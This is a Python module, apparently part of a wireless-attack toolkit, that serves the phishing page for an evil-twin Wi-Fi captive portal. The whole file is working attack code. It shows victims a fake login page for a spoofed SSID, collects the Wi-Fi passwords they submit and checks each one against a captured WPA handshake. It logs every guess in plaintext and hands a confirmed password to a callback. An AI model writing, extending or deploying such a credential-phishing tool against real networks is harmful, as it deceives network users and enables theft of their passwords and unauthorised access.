"""HTTP handler for the captive-portal phishing page.

Integrates the TCP stack with the portal page templates and password
validation via ``mic_matches``.  Serves the phishing page on GET and
validates submitted passwords on POST.
"""
from __future__ import annotations

import logging
from dataclasses import dataclass
from typing import Callable, Optional
from urllib.parse import parse_qs

from airscope.campaigns.eviltwin.portal_page import render_error, render_portal, render_success
from airscope.crack.handshake import CrackablePair, Handshake, mic_matches

log = logging.getLogger(__name__)


@dataclass
class PortalHttpHandler:
    """Bridges the TCP stack's HTTP callbacks to the portal page templates.

    ``on_password`` fires with the validated password when a correct one is submitted.
    """
    ssid: str = ""
    hs: Optional[Handshake] = None
    pair: Optional[CrackablePair] = None
    on_password: Optional[Callable[[str], None]] = None

    def handle_request(self, method: str, path: str, body: bytes) -> bytes:
        if method == "POST" and path == "/submit":
            return self._handle_submit(body)
        return self._page(render_portal(self.ssid))

    def _handle_submit(self, body: bytes) -> bytes:
        params = parse_qs(body.decode("utf-8", errors="replace"))
        password = params.get("password", [""])[0].strip()
        if not password:
            return self._page(render_error("Password cannot be empty.", self.ssid))

        if self.hs is not None and self.pair is not None:
            try:
                if mic_matches(password, self.ssid, self.hs, pair=self.pair):
                    log.info("password accepted: %s", password)
                    if self.on_password is not None:
                        self.on_password(password)
                    return self._page(render_success(password, self.ssid))
            except Exception:
                log.debug("mic_matches raised", exc_info=True)

        log.info("wrong password: %s", password)
        return self._page(render_error("Incorrect password. Please try again.", self.ssid))

    @staticmethod
    def _page(html: str) -> bytes:
        body = html.encode("utf-8")
        return (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: text/html; charset=utf-8\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n"
            b"Connection: close\r\n"
            b"\r\n" + body
        )
